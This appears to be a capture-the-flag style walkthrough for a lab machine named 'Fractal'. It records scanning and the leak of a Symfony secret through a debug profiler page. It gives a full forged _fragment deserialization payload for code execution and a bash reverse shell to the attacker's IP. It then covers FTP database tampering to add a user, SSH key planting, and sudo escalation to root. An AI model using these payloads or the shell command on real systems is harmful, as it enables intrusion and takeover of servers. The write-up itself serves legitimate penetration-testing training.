@@ -1,0 +1,159 @@
+																							    Fractal Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.233
+export IP=192.168.68.233
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p21,22,80 $IP --open --stats-every=5s -oN results.txt
+
+21/tcp open  ftp     ProFTPD
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/app_dev.php /app_dev.php/*
+
+
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+http-enum: 
+|   /robots.txt: Robots file
+|_  /phpmyadmin/: phpMyAdmin       // login page
+
+
+http://192.168.68.233/robots.txt
+# symfony 3.4 robots.txt
+/app_dev.php         // debug page
+/app_dev.php/*      // debug page
+
+
+Enumeration 
+
+ffuf -c -w /usr/share/wordlists/last_resort.txt -u http://$IP/FUZZ -t 500 -mc 200,300 
+
+
+http://192.168.68.233/app_dev.php/         debug page
+
+Go to Configuration tab and click on View full PHP configuration (http://192.168.68.233/app_dev.php/_profiler/phpinfo)
+
+Check the configuration file at  http://192.168.68.233/app_dev.php/_profiler/open?file=app/config/parameters.yml 
+
+# This file is auto-generated during the composer install
+parameters:
+    database_host: 127.0.0.1
+    database_port: 3306
+    database_name: symfony
+    database_user: symfony
+    database_password: symfony_db_password
+    mailer_transport: smtp
+    mailer_host: 127.0.0.1
+    mailer_user: null
+    mailer_password: null
+    secret: 48a8538e6260789558f0dfe29861c05b
+
+
+https://github.com/k1revam/OSCP-Scripts/edit/main/Symfony_secret_fragment_exploit.py
+
+
+
+Method 1 seems weird, let's try the second method.
+
+python symfony.py 'http://192.168.68.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.68.233/_fragment' --function system --parameters 'id'
+
+http://192.168.68.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522id%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&_hash=a6a%2BqW0vIprwrlTgrE6U6H2RUByu8JQQ%2F57c%2F%2F3wIZg%3D
+
+Paste the generated URL in browser and you should see the id command being ran.
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Now that we have code execution, let's try to obtain shell.
+
+python symfony.py 'http://192.168.68.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.68.233/_fragment' --function system --parameters "bash -c 'bash -i >& /dev/tcp/192.168.49.68/80 0>&1'"
+
+nc -lvnp 80
+
+Got shell!!
+
+cd /home/benoit
+cat local.txt             // flag: 800c9db5968f38816efa06d632276835
+
+
+Privilege escalation
+
+can't find shit
+
+Since we know there is a FTP service available, let's try to see if you get something good.
+
+cd /etc/proftpd
+cat sql.log
+# used to connect to the database 
+# databasename@host database_user user_password 
+SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password
+
+let's try to connect to the database with the credentials above
+
+mysql -uproftpd -pprotfpd_with_MYSQL_password
+
+show databases;
+use proftpd;
+show tables;
++-------------------+
+| Tables_in_proftpd |
++-------------------+
+| ftpgroup          |
+| ftpuser           |
++-------------------+
+
+select * from ftpuser;
++----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
+ | id  | userid  | passwd                                           | uid | gid | homedir          | shell           | count | accessed                    | modified            |
++----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
+ |  1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |  33 |  33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
++----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
+
+
+
+
+/bin/echo "{md5}"`/bin/echo -n "password" | openssl dgst -binary -md5 | openssl enc -base64`
+{md5}X03MO1qnZdYdgyfeuILPmQ==
+
+INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`, `accessed`, `modified`) VALUES (NULL, 'benoit', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29 ', '2022-09-27 05:26:29');
+
+Make sure you use the same data for accessed and modified columns as the one already registered, otherwise you will get an error!!!
+
+1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |   33   |   33  | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
+2 | benoit  | {md5}X03MO1qnZdYdgyfeuILPmQ==   | 1000 | 1000 | /                     | /bin/bash       |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
+
+Now that we've created our new user, let's try to connect to the FTP service and upload our own SSH keys
+
+ftp benoit@$IP
+dir    // we can see that we have access to the systems directory, now navigate to the user's home directory and create a .ssh folder to put our own SSH key in it
+cd /home/benoit
+mkdir .ssh
+
+Switch to another terminal on your own machine:
+On our own machine:
+ssh-keygen
+cp /root/.ssh/id_rsa.pub authorized_keys        // rename and copy the private key into the current directory where your FTP connection has been established.
+
+Switch back to the ftp terminal
+
+cd .ssh
+put authorized_keys
+ftp> ls
+229 Entering Extended Passive Mode (|||2349|)
+-rw-r--r--   1 benoit   benoit        563 Mar 23 22:26 authorized_keys           // now that we have our own key, let's connect to the SSH on benoit user
+
+
+ssh -i /root/.ssh/id_rsa benoit@$IP
+sudo -l
+(ALL) NOPASSWD: ALL
+sudo su
+cd /root
+cat proof.txt      //  8886771ecf118f79436fce1daa6cac09
